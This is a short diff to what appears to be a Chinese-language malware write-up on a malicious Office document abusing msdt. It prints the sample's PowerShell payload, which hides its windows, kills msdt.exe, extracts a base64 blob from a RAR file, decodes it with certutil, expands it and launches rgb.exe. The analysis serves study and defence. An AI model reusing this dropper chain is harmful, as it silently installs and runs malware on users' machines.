@@ -100,7 +100,7 @@ Flag: `document.xml.rels`
 ```bash
 $cmd = "c:\windows\system32\cmd.exe";
 Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";
-Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe";
+Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\ && for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe";
 ```
 以下是根據[^wp2]針對每一個步驟做簡短說明:
 > Starts hidden windows to:
